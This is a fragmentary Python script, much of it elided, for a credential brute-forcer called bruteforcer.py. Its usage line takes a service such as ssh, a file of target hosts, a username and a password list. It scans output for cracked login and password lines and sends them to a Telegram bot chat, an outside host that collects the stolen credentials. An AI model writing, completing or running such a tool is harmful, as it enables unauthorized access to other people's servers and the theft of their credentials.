...
# Configuration - Will be populated from command line args
CONFIG = {
    'telegram': {
        'bot_token': '',
        'chat_id': '',
...
def send_telegram_message(message):
    ...
    if not CONFIG['telegram']['bot_token'] or not CONFIG['telegram']['chat_id']:
        print(f"Telegram not configured: {message[:100]}...")
        return None
        ...
        if ('login:' in line and 'password:' in line) or ('[ssh]' in line and 'host:' in line):
            ...
            try:
                if 'login:' in line and 'password:' in line:
                    ...
                    username = parts[parts.index('[ssh]') + 3]
...
def main():
    if len(sys.argv) < 7:
        print("Usage: ./bruteforcer.py <service> <targets_file> <username> <password_list> <bot_token> <chat_id>")
        print("Example: ./bruteforcer.py ssh targets.txt root passwords.txt 123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11 -1001234567890")
        sys.exit(1)
    ...
    # Set Telegram configuration from command line
